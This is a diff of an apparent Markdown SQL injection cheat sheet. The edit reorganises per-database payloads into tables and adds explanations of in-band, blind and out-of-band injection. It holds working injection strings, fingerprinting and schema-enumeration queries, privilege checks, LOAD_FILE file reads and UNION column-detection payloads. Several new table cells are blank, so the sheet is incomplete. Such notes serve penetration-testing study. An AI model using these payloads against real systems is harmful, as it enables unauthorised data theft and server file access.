@@ -56,6 +56,11 @@ Next time an attacker logs in to the application with the admin account, the dat
 
 # Identifying SQLi
 ```sql
+'
+"
+#
+;
+)
 ' '
 '||'
 '+'
@@ -63,137 +68,86 @@ Next time an attacker logs in to the application with the admin account, the dat
 ' OR '1'='1
 ' -- -
 ' OR '1'='1;-- -
+[space]-- -
+[space]AND 1=1
+[space]AND 1=1 -- -
 ```
 
 * * *
 
 
 # Identifying Variants
-## MySQL
-```sql
-AND 'foo' 'bar' = 'foobar'	
-```
 
-## PostgreSQL
-```sql
-AND TO_HEX(1) = '1'	
-```
-
-## MSSQL
-```sql
-AND DATALENGTH('foo') = 3
-```
-
-## Oracle
-```sql
-AND LENGTHB('foo') = '3'	
-```
-
-## SQLite
-```sql
-AND GLOB('foo*', 'foobar') = 1	
-```
+| Order | Payload                        | DBMS       |
+|-------|--------------------------------|------------|
+| 1     | AND 'foo' 'bar' = 'foobar'	   | MySQL      |
+| 2     | AND DATALENGTH('foo') = 3      | MSSQL      |
+| 3     | AND TO_HEX(1) = '1'            | PostgreSQL |
+| 4     | AND LENGTHB('foo') = '3'       | Oracle     |
+| 5     | AND GLOB('foo*', 'foobar') = 1 | SQLite     |
 
 * * *
 
 # List Databases
-## MySQL
-```sql
-SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA
-SELECT db FROM mysql.db
-```
 
-## PostgreSQL	
-```sql
-SELECT datname FROM pg_database
-SELECT DISTINCT(schemaname) FROM pg_tables
-```
+| DBMS       | Payload                                                                          |
+|------------|----------------------------------------------------------------------------------|
+| MySQL      | SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA <br> SELECT db FROM mysql.db |
+| MSSQL      | SELECT name FROM master.sys.databases <br> SELECT name FROM master..sysdatabases |
+| PostgreSQL | SELECT datname FROM pg_database <br> SELECT DISTINCT(schemaname) FROM pg_tables  |
+| Oracle     | SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)                   |
+| SQLite     | N/A                                                                              |
 
-## MSSQL
-```sql
-SELECT name FROM master.sys.databases
-SELECT name FROM master..sysdatabases
-```
-
-## Oracle	
-```sql
-SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)
-```
-
-## SQLite	
-```
-N/A
-```
 
 * * *
 
 # List Tables
-## MySQL	
-```sql
-SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='[DBNAME]'
-SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name='[DBNAME]'
-```
 
-## PostgreSQL	
-```sql
-SELECT tablename FROM pg_tables WHERE schemaname = '[SCHEMA_NAME]'
-SELECT table_name FROM information_schema.tables WHERE table_schema='[SCHEMA_NAME]'
-```
-
-## MSSQL	
-```sql
-SELECT table_name FROM information_schema.tables WHERE table_catalog='[DBNAME]'
-SELECT name FROM [DBNAME]..sysobjects WHERE xtype='U'
-```
-
-## Oracle	
-```sql
-SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='[DBNAME]'
-```
-
-## SQLite	
-```sql
-SELECT tbl_name FROM sqlite_master WHERE type='table'
-```
+| DBMS       | Payload                                                              |
+|------------|----------------------------------------------------------------------|
+| MySQL      | SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='[DBNAME]' <br> SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name='[DBNAME]'                                   |
+| MSSQL      | SELECT table_name FROM information_schema.tables WHERE table_catalog='[DBNAME]' <br> SELECT name FROM [DBNAME]..sysobjects WHERE xtype='U'                                                                           |
+| PostgreSQL | SELECT tablename FROM pg_tables WHERE schemaname = '[SCHEMA_NAME]' <br> SELECT table_name FROM information_schema.tables WHERE table_schema='[SCHEMA_NAME]'                                                        |
+| Oracle     | SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='[DBNAME]'   |
+| SQLite     | SELECT tbl_name FROM sqlite_master WHERE type='table'                |
 
 * * *
 
 # List Columns
-## MySQL
-```sql
-SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='[TABLE_NAME]' AND table_schema='[DBNAME]'
-```
 
-## PostgreSQL	
-```sql
-SELECT column_name,data_type FROM information_schema.columns WHERE table_schema='[DBNAME]' AND table_name='[TABLE_NAME]'
-```
+| DBMS       | Payload                                                                                                                    |
+|------------|----------------------------------------------------------------------------------------------------------------------------|
+| MySQL      | SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='[TABLE_NAME]' AND table_schema='[DBNAME]' |
+| MSSQL      | SELECT COL_NAME(OBJECT_ID('[DBNAME].[TABLE_NAME]'), [INDEX])                                                               |
+| PostgreSQL | SELECT column_name,data_type FROM information_schema.columns WHERE table_schema='[DBNAME]' AND table_name='[TABLE_NAME]'   |
+| Oracle     | SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='[TABLE_NAME]' AND OWNER='[DBNAME]'                 |
+| SQLite     | SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='[TABLE_NAME]' <br> SELECT name FROM PRAGMA_TABLE_INFO('[TABLE_NAME]')   |
 
-## MSSQL
-```sql
-SELECT COL_NAME(OBJECT_ID('[DBNAME].[TABLE_NAME]'), [INDEX])
-```
+* * *
 
-## Oracle	
-```sql
-SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='[TABLE_NAME]' AND OWNER='[DBNAME]'
-```
+# Dump Data
 
-## SQLite
-```sql
-SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='[TABLE_NAME]'
-SELECT name FROM PRAGMA_TABLE_INFO('[TABLE_NAME]')
-```
+| DBMS       | Payload                                                                          |
+|------------|----------------------------------------------------------------------------------|
+| MySQL      | SELECT [COLUMN_NAME] FROM [DBNAME].[TABLE_NAME] |
+| MSSQL      |  |
+| PostgreSQL |   |
+| Oracle     |                |
+| SQLite     | N/A     
+
 
 * * *
 
 # DB User
-## MySQL
-```sql
-SELECT USER()
-SELECT CURRENT_USER()
-SELECT user from mysql.user
-```
+Determine which user we are within the database.
+
+| DBMS       | Payload                                                                          |
+|------------|----------------------------------------------------------------------------------|
+| MySQL      | SELECT USER() <br> SELECT CURRENT_USER() <br> SELECT user from mysql.user        |
+| MSSQL      |  |
+| PostgreSQL |   |
+| Oracle     |                    |
+| SQLite     |   
 
 * * *
 
@@ -201,20 +155,27 @@ SELECT user from mysql.user
 Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:
 
 ## Super admin privileges
-> The query returns Y, which means YES, indicating superuser privileges. 
+The query returns Y, which means YES, indicating superuser privileges. 
 
-### MySQL
-```sql
-SELECT , super_priv FROM mysql.user WHERE user="user";
-```
+| DBMS       | Payload                                                                          |
+|------------|----------------------------------------------------------------------------------|
+| MySQL      | SELECT super_priv FROM mysql.user WHERE user='[DB_USER]'        |
+| MSSQL      |  |
+| PostgreSQL |   |
+| Oracle     |                    |
+| SQLite     |   
+
 
 ## Other Privileges
-> We can also dump other privileges we have directly from the schema, with the following query:
+We can also dump other privileges we have directly from the schema, with the following query:
 
-### MySQL
-```sql
-SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="user@host";-- -
-```
+| DBMS       | Payload                                                                          |
+|------------|----------------------------------------------------------------------------------|
+| MySQL      | SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'[DB_USER]@localhost'"        |
+| MSSQL      |  |
+| PostgreSQL |   |
+| Oracle     |                    |
+| SQLite     |   
 
 * * *
 
@@ -222,10 +183,14 @@ SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE gra
 First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:
 
 ## Read
-### MySQL
-```sql
-LOAD_FILE('/path/to/file')
-```
+
+| DBMS       | Payload                                                                          |
+|------------|----------------------------------------------------------------------------------|
+| MySQL      | LOAD_FILE('/path/to/file')        |
+| MSSQL      |  |
+| PostgreSQL |   |
+| Oracle     |                    |
+| SQLite     |  
 
 To be able to write files to the back-end server using a MySQL database, we require three things:
 
@@ -289,10 +254,20 @@ SELECT writefile('/path/to/file', column_name) FROM table_name
 
 * * *
 
-# Union Based
-## Detect number of columns
-###  MySQL
-#### Using Order By
+# In-Band 
+In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as In-band SQL injection, and it has two types: Union Based and Error Based.
+
+## Union Based
+With Union Based SQL injection, we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there. 
+
+### Detect number of columns
+A UNION statement can only operate on SELECT statements with an equal number of columns. 
+
+When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. 
+For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.
+
+####  MySQL
+##### Using Order By
 The first way of detecting the number of columns is through the ORDER BY function, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.
 
 For example, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.
@@ -303,12 +278,29 @@ If we failed at order by 4, this means the table has three columns, which is the
 cn' order by 1;-- -
 ```
 
-#### Using UNION
+##### Using UNION
 The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. 
 
 ```sql
 cn' UNION select 1,2,3;-- -
 ```
+
+## Error Based
+As for Error Based SQL injection, it is used when we can get the PHP or SQL errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.
+
+
+# Blind
+In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. This is known as Blind SQL injection, and it also has two types: Boolean Based and Time Based.
+
+## Boolean Based 
+With Boolean Based SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns true.
+
+## Timed Based
+As for Time Based SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.
+
+# Out Of Band
+In some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. This is known as Out-of-band SQL injection.
+
 
 * * *
 
